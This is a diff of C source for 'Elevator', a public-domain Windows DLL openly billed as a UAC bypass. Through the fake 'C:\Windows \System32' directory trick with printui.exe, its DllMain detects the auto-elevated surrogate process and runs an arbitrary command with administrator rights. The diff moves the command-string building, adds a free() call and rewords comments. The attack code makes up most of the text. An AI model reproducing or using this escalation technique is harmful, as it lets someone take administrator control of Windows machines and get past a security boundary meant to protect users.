@@ -1,5 +1,5 @@
 /*
- * Elevator - Privilege escalation as a service
+ * Elevator - It's like system(3) but it bypasses UAC
  *
  * This is free and unencumbered software released into the public domain.
  *
@@ -91,37 +91,36 @@ static int tearDownEnvironment() {
 }
 
 int elevator(const char* command) {
-    // Allocate and build the full command line string
-    const char* commandPrefix = "cmd /c C:\\Windows\" \"\\System32\\printui.exe ";
-    const char* commandSuffix = command;
-    command = strcat((char*) realloc(_strdup(commandPrefix), strlen(commandPrefix) + strlen(commandSuffix) + 1), commandSuffix);
-
     // Set up the elevation environment
     if (setUpEnvironment()) {
         return 1;
     }
 
+    // Allocate and build the full command line string
+    const char* commandPrefix = "cmd /c C:\\Windows\" \"\\System32\\printui.exe ";
+    const char* commandSuffix = command;
+    command = strcat((char*) realloc(_strdup(commandPrefix), strlen(commandPrefix) + strlen(commandSuffix) + 1), commandSuffix);
+
     // Aaaaaaand run it...
     system(command);
 
-    // Tear down the elevation environment
-    if (tearDownEnvironment()) {
-        return 1;
-    }
+    // Deallocate full command line string
+    free(command);
 
-    return 0;
+    // Tear down the elevation environment
+    return tearDownEnvironment();
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
     switch (fdwReason) {
         case DLL_PROCESS_ATTACH: {
-            // A string to search for to see if we're in the surrogate process
+            // A string to search for to see if we're in the elevated surrogate process
             const char magic[] = "\"C:\\Windows \\System32\\printui.exe\" ";
 
             // The full command line string of this process
             const char* cmdline = GetCommandLineA();
 
-            // If it looks like we just attached to the auto-elevating host process
+            // If we just attached to the elevated surrogate process
             if (memcmp(cmdline, magic, sizeof magic - 1) == 0) {
                 // We are elevated, so slice off and execute the user's command string!
                 system(&cmdline[sizeof magic]);
@@ -133,7 +132,5 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
         case DLL_THREAD_ATTACH:
         case DLL_THREAD_DETACH:
             return TRUE;
-        default:
-            return FALSE;
     }
 }
